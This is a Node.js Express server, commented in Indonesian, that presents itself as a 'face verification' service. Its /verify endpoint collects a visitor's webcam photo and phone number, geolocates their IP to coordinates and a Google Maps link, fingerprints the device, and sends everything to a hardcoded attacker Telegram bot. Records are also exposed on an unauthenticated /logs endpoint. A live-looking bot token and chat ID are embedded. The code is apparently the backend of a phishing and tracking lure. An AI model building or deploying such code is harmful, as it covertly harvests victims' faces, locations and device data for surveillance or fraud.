const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// AMBIL DARI ENVIRONMENT VARIABLE RAILWAY
const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = process.env.CHAT_ID || '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log(`🌐 PORT: ${PORT}`);
console.log('========================================');

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Database
const db = [];

// ===== DETEKSI DEVICE DARI USER-AGENT =====
function detectDevice(userAgent) {
  if (!userAgent) return 'Tidak diketahui';
  
  const ua = userAgent.toLowerCase();
  let device = {
    browser: 'Tidak diketahui',
    os: 'Tidak diketahui',
    device: 'Tidak diketahui',
    brand: 'Tidak diketahui',
    model: 'Tidak diketahui'
  };
  
  // Deteksi Browser
  if (ua.includes('chrome')) device.browser = 'Chrome';
  else if (ua.includes('firefox')) device.browser = 'Firefox';
  else if (ua.includes('safari')) device.browser = 'Safari';
  else if (ua.includes('edge')) device.browser = 'Edge';
  else if (ua.includes('opera')) device.browser = 'Opera';
  else if (ua.includes('ucbrowser')) device.browser = 'UC Browser';
  else if (ua.includes('miui')) device.browser = 'Mi Browser';
  
  // Deteksi OS
  if (ua.includes('android')) {
    device.os = 'Android';
    // Deteksi versi Android
    const androidMatch = ua.match(/android\s([\d.]+)/);
    if (androidMatch) device.os += ` ${androidMatch[1]}`;
  } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
    device.os = 'iOS';
    const iosMatch = ua.match(/os\s([\d_]+)/);
    if (iosMatch) device.os += ` ${iosMatch[1].replace(/_/g, '.')}`;
  } else if (ua.includes('windows')) {
    device.os = 'Windows';
    if (ua.includes('windows nt 10.0')) device.os += ' 10';
    else if (ua.includes('windows nt 6.3')) device.os += ' 8.1';
    else if (ua.includes('windows nt 6.2')) device.os += ' 8';
    else if (ua.includes('windows nt 6.1')) device.os += ' 7';
  } else if (ua.includes('mac')) {
    device.os = 'macOS';
  } else if (ua.includes('linux')) {
    device.os = 'Linux';
  }
  
  // Deteksi Tipe Device
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone') || ua.includes('ipod')) {
    device.device = 'Mobile';
  } else if (ua.includes('tablet') || ua.includes('ipad')) {
    device.device = 'Tablet';
  } else {
    device.device = 'Desktop';
  }
  
  // Deteksi Brand HP
  const brands = [
    { name: 'Samsung', patterns: ['samsung', 'sm-'] },
    { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
    { name: 'Realme', patterns: ['realme'] },
    { name: 'Oppo', patterns: ['oppo'] },
    { name: 'Vivo', patterns: ['vivo'] },
    { name: 'OnePlus', patterns: ['oneplus'] },
    { name: 'Google', patterns: ['pixel'] },
    { name: 'Huawei', patterns: ['huawei', 'honor'] },
    { name: 'Nokia', patterns: ['nokia'] },
    { name: 'Sony', patterns: ['sony'] },
    { name: 'LG', patterns: ['lg-'] },
    { name: 'Asus', patterns: ['asus'] },
    { name: 'Lenovo', patterns: ['lenovo'] },
    { name: 'Infinix', patterns: ['infinix'] },
    { name: 'Tecno', patterns: ['tecno'] }
  ];
  
  for (const brand of brands) {
    if (brand.patterns.some(p => ua.includes(p))) {
      device.brand = brand.name;
      break;
    }
  }
  
  // Deteksi Model (coba ambil dari user-agent)
  if (device.brand === 'Samsung') {
    const samsungMatch = ua.match(/sm-[a-z0-9]+/i);
    if (samsungMatch) device.model = samsungMatch[0].toUpperCase();
  } else if (device.brand === 'Xiaomi') {
    const xiaomiMatch = ua.match(/mi\s[a-z0-9]+/i) || ua.match(/redmi\s[a-z0-9]+/i);
    if (xiaomiMatch) device.model = xiaomiMatch[0];
  } else if (device.brand === 'Realme') {
    const realmeMatch = ua.match(/realme\s[a-z0-9]+/i);
    if (realmeMatch) device.model = realmeMatch[0];
  } else if (device.brand === 'Oppo') {
    const oppoMatch = ua.match(/oppo\s[a-z0-9]+/i);
    if (oppoMatch) device.model = oppoMatch[0];
  } else if (device.brand === 'Vivo') {
    const vivoMatch = ua.match(/vivo\s[a-z0-9]+/i);
    if (vivoMatch) device.model = vivoMatch[0];
  } else if (device.brand === 'Google') {
    const pixelMatch = ua.match(/pixel\s[a-z0-9]+/i);
    if (pixelMatch) device.model = pixelMatch[0];
  }
  
  return device;
}

// ===== GET LOKASI AKURAT DARI IP =====
async function getLocationDetails(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return null;
    
    console.log(`🔍 Getting location for IP: ${cleanIp}`);
    
    // Gunakan ip-api.com dengan lebih banyak field
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting`);
    const data = await res.json();
    
    console.log(`📍 Location API response:`, data.status);
    
    if (data.status === 'success') {
      // Deteksi apakah ini IP mobile
      const isMobile = data.mobile || data.isp?.toLowerCase().includes('mobile') || data.isp?.toLowerCase().includes('cellular');
      
      // Deteksi provider
      let provider = data.isp || data.org || 'Tidak diketahui';
      if (provider.includes('PT ')) provider = provider.replace('PT ', '');
      
      return {
        ip: data.query,
        country: data.country || '-',
        countryCode: data.countryCode || '-',
        region: data.regionName || '-',
        regionCode: data.region || '-',
        city: data.city || '-',
        zip: data.zip || '-',
        latitude: data.lat || 0,
        longitude: data.lon || 0,
        timezone: data.timezone || '-',
        isp: data.isp || '-',
        org: data.org || '-',
        as: data.as || '-',
        isMobile: isMobile || false,
        isProxy: data.proxy || false,
        isHosting: data.hosting || false,
        provider: provider,
        fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
        googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`,
        googleMapsShort: `https://maps.google.com/?q=${data.lat || 0},${data.lon || 0}`,
        // Link untuk melihat di maps dengan lebih detail
        googleMapsDetailed: `https://www.google.com/maps/place/${data.lat || 0},${data.lon || 0}/@${data.lat || 0},${data.lon || 0},15z`
      };
    }
    return null;
  } catch (e) {
    console.error('Geolocation error:', e.message);
    return null;
  }
}

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(photoBuffer, locationData, deviceData, phone, ip, userAgent) {
  try {
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
    caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
    caption += `🕒 *Waktu:* ${timestamp}\n\n`;
    
    // ===== INFO DEVICE =====
    if (deviceData) {
      caption += `📱 *Device Info:*\n`;
      caption += `   📱 Tipe: ${deviceData.device}\n`;
      caption += `   🏷️ Brand: ${deviceData.brand}\n`;
      if (deviceData.model && deviceData.model !== 'Tidak diketahui') {
        caption += `   📟 Model: ${deviceData.model}\n`;
      }
      caption += `   💻 OS: ${deviceData.os}\n`;
      caption += `   🌐 Browser: ${deviceData.browser}\n\n`;
    }
    
    // ===== LOKASI =====
    if (locationData) {
      caption += `📍 *Lokasi:*\n`;
      caption += `   🏙️ ${locationData.fullLocation}\n`;
      caption += `   📮 Zip: ${locationData.zip}\n`;
      caption += `   🌐 Timezone: ${locationData.timezone}\n`;
      caption += `   📡 Provider: ${locationData.provider}\n`;
      
      if (locationData.isMobile) {
        caption += `   📱 IP Mobile: Ya\n`;
      }
      
      caption += `\n🗺️ *Google Maps:*\n`;
      caption += `${locationData.googleMapsDetailed}\n\n`;
      
      caption += `📊 *Koordinat:*\n`;
      caption += `   ${locationData.latitude}, ${locationData.longitude}\n\n`;
    }
    
    // ===== IP =====
    caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
    caption += `_Foto diterima untuk verifikasi_`;

    console.log('📤 Sending to Telegram...');
    console.log(`📸 Photo size: ${photoBuffer.length} bytes`);

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('photo', photoBuffer, { 
      filename: `verifikasi_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });

    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
    
    if (!tgData.ok) {
      console.log('❌ Error details:', JSON.stringify(tgData));
    }
    
    // Kirim lokasi terpisah
    if (locationData && locationData.latitude && locationData.longitude) {
      await sendLocation(locationData.latitude, locationData.longitude);
    }
    
    return tgData;
  } catch (err) {
    console.error('Send to Telegram error:', err);
    return null;
  }
}

// ===== SEND LOCATION =====
async function sendLocation(lat, lon) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        latitude: lat,
        longitude: lon
      })
    });
    const data = await response.json();
    console.log('📍 Location sent:', data.ok ? '✅ Success' : '❌ Failed');
    return data;
  } catch (err) {
    console.error('Send location error:', err);
    return null;
  }
}

// ===== WEBHOOK =====
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    console.log('📨 Webhook received');
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      const total = db.length;
      let response = `📊 *DATA VERIFIKASI*\n\n`;
      response += `Total: ${total} orang\n\n`;
      
      db.forEach((user, index) => {
        const lastIndex = db.length - 1;
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp}\n`;
        response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
        response += `   📱 ${user.device || 'Tidak diketahui'}\n`;
        if (index < lastIndex) response += `\n`;
      });
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: response,
          parse_mode: 'Markdown'
        })
      });
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// ===== VERIFY ENDPOINT =====
app.post('/verify', async (req, res) => {
  console.log('📸 ===== NEW VERIFICATION =====');
  console.log('📸 Time:', new Date().toISOString());
  
  try {
    const { image, phone } = req.body;
    
    console.log(`📸 Image exists: ${image ? 'YES' : 'NO'}`);
    console.log(`📸 Image length: ${image ? image.length : 0}`);
    
    if (!image) {
      console.log('❌ No image');
      return res.json({ success: false, error: 'No image' });
    }
    
    // Get IP dan User Agent
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    
    console.log(`🌐 IP: ${ip}`);
    console.log(`📱 User-Agent: ${userAgent.substring(0, 100)}...`);
    
    // Get location details
    const locationData = await getLocationDetails(ip);
    console.log(`📍 Location:`, locationData ? locationData.fullLocation : 'Not found');
    
    // Detect device
    const deviceData = detectDevice(userAgent);
    console.log(`📱 Device:`, deviceData);
    
    // Process image
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    console.log(`📸 Image size: ${buffer.length} bytes`);
    
    // Simpan ke database
    const userData = {
      phone: phone || `User_${Date.now().toString().slice(-6)}`,
      timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
      location: locationData ? locationData.fullLocation : 'Tidak diketahui',
      device: deviceData ? `${deviceData.brand} ${deviceData.model}`.trim() || deviceData.device : 'Tidak diketahui',
      ip: ip,
      latitude: locationData ? locationData.latitude : 0,
      longitude: locationData ? locationData.longitude : 0,
      googleMaps: locationData ? locationData.googleMapsLink : '-',
      provider: locationData ? locationData.provider : '-',
      os: deviceData ? deviceData.os : '-',
      browser: deviceData ? deviceData.browser : '-'
    };
    db.push(userData);
    console.log('💾 Data saved');
    
    // Send to Telegram
    const result = await sendToTelegram(buffer, locationData, deviceData, phone, ip, userAgent);
    
    if (result && result.ok) {
      console.log('✅ Success!');
      res.json({ success: true });
    } else {
      console.log('❌ Failed to send to Telegram');
      res.json({ success: false, error: 'Telegram error' });
    }
    
  } catch (err) {
    console.error('❌ Error:', err);
    res.json({ success: false, error: err.message });
  }
});

// ===== TEST ENDPOINTS =====
app.get('/test', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/send', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '✅ Bot is working!'
      })
    });
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/logs', (req, res) => {
  res.json({ 
    totalUsers: db.length,
    users: db
  });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log('========================================');
});
